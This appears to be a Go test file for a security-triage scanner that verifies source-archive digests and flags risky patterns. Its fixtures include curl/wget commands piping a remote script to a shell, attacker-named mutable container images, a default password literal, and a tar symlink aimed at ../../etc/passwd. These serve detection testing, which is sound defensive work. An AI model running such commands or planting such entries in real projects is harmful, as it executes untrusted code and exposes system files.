package main

import (
	"archive/tar"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"sort"
	"strings"
	"testing"
)

const testSourceCommit = "0123456789abcdef0123456789abcdef01234567"

type testArchiveEntry struct {
	name     string
	contents []byte
	mode     int64
}

func TestSecurityTriageScansDigestAndTreeBoundTrackedSource(t *testing.T) {
	entries := []testArchiveEntry{
		{name: ".github/workflows/release.yml", contents: []byte("steps:\n  - uses: actions/checkout@v4\n"), mode: 0o644},
		{name: "src/config.ts", contents: []byte("const endpoint = \"https://openrouter.ai/api/v1\"\n"), mode: 0o755},
	}
	archive, archiveDigest, manifestDigest := writeTestArchive(t, entries, true)
	report, err := runTestTriage(archive, archiveDigest, manifestDigest)
	if err != nil {
		t.Fatalf("runSecurityTriage returned error: %v", err)
	}
	if report.ScannerSourceCommit != testSourceCommit || report.SourceTreeManifestSHA256 != manifestDigest {
		t.Fatalf("unexpected provenance: %#v", report)
	}
	if report.Status != "findings" || report.ScannedFiles != 2 || report.Summary.High != 2 {
		t.Fatalf("unexpected report: %#v", report)
	}
	if got := report.Findings[0].RuleID; got != "UNPINNED_WORKFLOW_ACTION" {
		t.Fatalf("unexpected first finding: %s", got)
	}
}

func TestSecurityTriageAcceptsRealGitArchiveLayout(t *testing.T) {
	rootOutput, err := exec.Command("git", "rev-parse", "--show-toplevel").Output()
	if err != nil {
		t.Fatalf("locate repository: %v", err)
	}
	archive := filepath.Join(t.TempDir(), "source.tar")
	command := exec.Command("git", "-C", strings.TrimSpace(string(rootOutput)), "archive", "--format=tar", "--output="+archive, "HEAD", "examples/go_agent_nodes")
	if output, err := command.CombinedOutput(); err != nil {
		t.Fatalf("git archive: %v: %s", err, output)
	}
	entries := readArchiveTreeEntries(t, archive)
	report, err := runTestTriage(archive, fileSHA256(t, archive), sourceTreeManifestDigest(entries))
	if err != nil {
		t.Fatalf("real git archive rejected: %v", err)
	}
	if report.ScannedFiles == 0 {
		t.Fatal("expected scanned files")
	}
}

func TestSecurityTriageFailsClosedOnTreeOrTaskMutation(t *testing.T) {
	entry := testArchiveEntry{name: "src/index.ts", contents: []byte("export const ok = true\n"), mode: 0o644}
	archive, archiveDigest, manifestDigest := writeTestArchive(t, []testArchiveEntry{entry}, true)
	_, err := runTestTriage(archive, archiveDigest, "sha256:"+strings.Repeat("f", 64))
	if err == nil || !strings.Contains(err.Error(), "manifest mismatch") {
		t.Fatalf("expected manifest mismatch, got %v", err)
	}

	input := securityTriageInput(archiveDigest, manifestDigest)
	message := input["message"].(string)
	input["message"] = strings.Replace(message, archiveDigest, "sha256:"+strings.Repeat("f", 64), 1)
	if _, err := runSecurityTriage(input, archive); err == nil {
		t.Fatal("expected archive task mutation to fail")
	}

	input = securityTriageInput(archiveDigest, manifestDigest)
	input["message"] = input["message"].(string) + `{}`
	if _, err := runSecurityTriage(input, archive); err == nil {
		t.Fatal("expected trailing task data to fail")
	}
}

func TestSecurityTriageRejectsUnsafeOrUnscannableEntries(t *testing.T) {
	for name, entries := range map[string][]testArchiveEntry{
		"non_utf8": {{name: "src/binary.ts", contents: []byte{0xff}, mode: 0o644}},
		"nul":      {{name: "src/nul.ts", contents: []byte{'o', 'k', 0}, mode: 0o644}},
	} {
		t.Run(name, func(t *testing.T) {
			archive, archiveDigest, manifestDigest := writeTestArchive(t, entries, false)
			if _, err := runTestTriage(archive, archiveDigest, manifestDigest); err == nil {
				t.Fatal("expected unsafe entry to fail")
			}
		})
	}

	t.Run("untracked symlink beside expected file", func(t *testing.T) {
		archive := filepath.Join(t.TempDir(), "symlink.tar")
		file, err := os.Create(archive)
		if err != nil {
			t.Fatal(err)
		}
		writer := tar.NewWriter(file)
		if err := writer.WriteHeader(&tar.Header{Name: "escape", Typeflag: tar.TypeSymlink, Linkname: "../../etc/passwd"}); err != nil {
			t.Fatal(err)
		}
		contents := []byte("export const ok = true\n")
		if err := writer.WriteHeader(&tar.Header{Name: "src/index.ts", Typeflag: tar.TypeReg, Mode: 0o644, Size: int64(len(contents))}); err != nil {
			t.Fatal(err)
		}
		if _, err := writer.Write(contents); err != nil {
			t.Fatal(err)
		}
		if err := writer.Close(); err != nil {
			t.Fatal(err)
		}
		if err := file.Close(); err != nil {
			t.Fatal(err)
		}
		manifest := sourceTreeManifestDigest([]sourceTreeEntry{{
			mode: "100644", oid: gitBlobSHA1(contents), size: int64(len(contents)), path: "src/index.ts",
		}})
		if _, err := runTestTriage(archive, fileSHA256(t, archive), manifest); err == nil {
			t.Fatal("expected untracked symlink entry to fail")
		}
	})

	t.Run("untracked directory beside expected file", func(t *testing.T) {
		entries := []testArchiveEntry{{name: "src/index.ts", contents: []byte("export const ok = true\n"), mode: 0o644}}
		archive, archiveDigest, manifestDigest := writeTestArchive(t, entries, true)
		appendUntrackedDirectory(t, archive, "untracked/")
		if _, err := runTestTriage(archive, fileSHA256(t, archive), manifestDigest); err == nil ||
			!strings.Contains(err.Error(), "directory set mismatch") {
			t.Fatalf("expected untracked directory to fail, got %v (original digest %s)", err, archiveDigest)
		}
	})
}

func TestSecurityTriageArchivePathContract(t *testing.T) {
	if securityTriageArchivePath != "/input/source.tar" {
		t.Fatalf("unexpected security triage archive path %q", securityTriageArchivePath)
	}
}

func TestSecurityTriageRulesCoverDynamicImagesAndTrackedText(t *testing.T) {
	cases := []struct {
		name string
		line string
		rule string
	}{
		{name: "docs/design.md", line: "curl https://example.invalid/install | sh", rule: "REMOTE_SCRIPT_PIPE"},
		{name: "scripts/install.sh", line: "curl https://example.invalid/install \\\n| sh", rule: "REMOTE_SCRIPT_PIPE"},
		{name: "scripts/install.sh", line: "curl https://example.invalid/install |\nsh", rule: "REMOTE_SCRIPT_PIPE"},
		{name: "scripts/install.sh", line: "wget https://example.invalid/install |&\nbash", rule: "REMOTE_SCRIPT_PIPE"},
		{name: "scripts/install.sh", line: "curl https://example.invalid/install |\n\nsh", rule: "REMOTE_SCRIPT_PIPE"},
		{name: "scripts/install.sh", line: "curl https://example.invalid/install |\n# reviewed\nsh", rule: "REMOTE_SCRIPT_PIPE"},
		{name: "compose.yml", line: "image: ${IMAGE:-attacker/image:latest}", rule: "MUTABLE_EXTERNAL_IMAGE"},
		{name: "compose.yml", line: "image: bee-lab-evil:latest", rule: "MUTABLE_EXTERNAL_IMAGE"},
		{name: "config.txt", line: "password=changeme", rule: "DEFAULT_CREDENTIAL_LITERAL"},
	}
	for _, testCase := range cases {
		findings, err := scanSecurityFile(testCase.name, testCase.line)
		if err != nil {
			t.Fatal(err)
		}
		if len(findings) != 1 || findings[0].RuleID != testCase.rule {
			t.Fatalf("%s: unexpected findings %#v", testCase.name, findings)
		}
	}
}

func TestSecurityTriageShellContinuationsAreBoundedAndRequireAnUnescapedBackslash(t *testing.T) {
	findings, err := scanSecurityFile("scripts/install.sh", `curl https://example.invalid/install \\
| sh`)
	if err != nil {
		t.Fatal(err)
	}
	if len(findings) != 0 {
		t.Fatalf("escaped backslash must not join shell lines: %#v", findings)
	}

	findings, err = scanSecurityFile("scripts/install.sh", "printf 'curl https://example.invalid/install |'\nsh")
	if err != nil {
		t.Fatal(err)
	}
	if len(findings) != 0 {
		t.Fatalf("quoted pipe must not join shell lines: %#v", findings)
	}

	findings, err = scanSecurityFile("scripts/install.txt", "curl https://example.invalid/install \\\n| sh")
	if err != nil {
		t.Fatal(err)
	}
	if len(findings) != 1 || findings[0].RuleID != "REMOTE_SCRIPT_PIPE" || findings[0].Line != 1 {
		t.Fatalf("filename must not disable logical remote-pipe scanning: %#v", findings)
	}

	oversized := strings.Repeat("x", 600_000) + "\\\n" + strings.Repeat("y", 600_000)
	if _, err := scanSecurityFile("scripts/install.sh", oversized); err == nil ||
		!strings.Contains(err.Error(), "logical line rejected: scripts/install.sh") {
		t.Fatalf("expected path-bound oversized logical line rejection, got %v", err)
	}
}

func runTestTriage(archive, archiveDigest, manifestDigest string) (securityTriageReport, error) {
	securityTriageSourceCommit = testSourceCommit
	return runSecurityTriage(securityTriageInput(archiveDigest, manifestDigest), archive)
}

func securityTriageInput(archiveDigest, manifestDigest string) map[string]any {
	message, _ := json.Marshal(securityTriageTask{
		SchemaVersion:            "bee.security-triage-task.v1",
		RequestID:                "request-1",
		Scope:                    "tracked-source",
		SourceArchiveSHA256:      archiveDigest,
		SourceTreeManifestSHA256: manifestDigest,
		SourceCommit:             testSourceCommit,
	})
	return map[string]any{"message": string(message)}
}

func writeTestArchive(t *testing.T, entries []testArchiveEntry, directories bool) (string, string, string) {
	t.Helper()
	archive := filepath.Join(t.TempDir(), "source.tar")
	file, err := os.Create(archive)
	if err != nil {
		t.Fatal(err)
	}
	writer := tar.NewWriter(file)
	if directories {
		directorySet := make(map[string]struct{})
		for _, entry := range entries {
			for directory := filepath.ToSlash(filepath.Dir(entry.name)); directory != "."; directory = filepath.ToSlash(filepath.Dir(directory)) {
				directorySet[directory] = struct{}{}
			}
		}
		directoryNames := make([]string, 0, len(directorySet))
		for directory := range directorySet {
			directoryNames = append(directoryNames, directory)
		}
		sort.Strings(directoryNames)
		for _, directory := range directoryNames {
			if err := writer.WriteHeader(&tar.Header{Name: directory + "/", Typeflag: tar.TypeDir, Mode: 0o755}); err != nil {
				t.Fatal(err)
			}
		}
	}
	treeEntries := make([]sourceTreeEntry, 0, len(entries))
	for _, entry := range entries {
		mode := entry.mode
		if mode == 0 {
			mode = 0o644
		}
		if err := writer.WriteHeader(&tar.Header{Name: entry.name, Typeflag: tar.TypeReg, Mode: mode, Size: int64(len(entry.contents))}); err != nil {
			t.Fatal(err)
		}
		if _, err := writer.Write(entry.contents); err != nil {
			t.Fatal(err)
		}
		treeEntries = append(treeEntries, sourceTreeEntry{mode: sourceTreeMode(mode), oid: gitBlobSHA1(entry.contents), size: int64(len(entry.contents)), path: entry.name})
	}
	if err := writer.Close(); err != nil {
		t.Fatal(err)
	}
	if err := file.Close(); err != nil {
		t.Fatal(err)
	}
	return archive, fileSHA256(t, archive), sourceTreeManifestDigest(treeEntries)
}

func appendUntrackedDirectory(t *testing.T, archivePath, name string) {
	t.Helper()
	contents, err := os.ReadFile(archivePath)
	if err != nil {
		t.Fatal(err)
	}
	for len(contents) >= 1024 && string(contents[len(contents)-1024:]) == strings.Repeat("\x00", 1024) {
		contents = contents[:len(contents)-1024]
	}
	file, err := os.Create(archivePath)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := file.Write(contents); err != nil {
		t.Fatal(err)
	}
	writer := tar.NewWriter(file)
	if err := writer.WriteHeader(&tar.Header{Name: name, Typeflag: tar.TypeDir, Mode: 0o755}); err != nil {
		t.Fatal(err)
	}
	if err := writer.Close(); err != nil {
		t.Fatal(err)
	}
	if err := file.Close(); err != nil {
		t.Fatal(err)
	}
}

func readArchiveTreeEntries(t *testing.T, archivePath string) []sourceTreeEntry {
	t.Helper()
	file, err := os.Open(archivePath)
	if err != nil {
		t.Fatal(err)
	}
	defer file.Close()
	reader := tar.NewReader(file)
	entries := []sourceTreeEntry{}
	for {
		header, err := reader.Next()
		if err == io.EOF {
			break
		}
		if err != nil {
			t.Fatal(err)
		}
		if header.Typeflag == tar.TypeDir || header.Typeflag == tar.TypeXGlobalHeader {
			continue
		}
		if header.Typeflag != tar.TypeReg {
			t.Fatalf("unexpected archive type %d", header.Typeflag)
		}
		contents, err := io.ReadAll(reader)
		if err != nil {
			t.Fatal(err)
		}
		entries = append(entries, sourceTreeEntry{mode: sourceTreeMode(header.Mode), oid: gitBlobSHA1(contents), size: header.Size, path: header.Name})
	}
	return entries
}

func fileSHA256(t *testing.T, path string) string {
	t.Helper()
	contents, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	digest := sha256.Sum256(contents)
	return "sha256:" + hex.EncodeToString(digest[:])
}
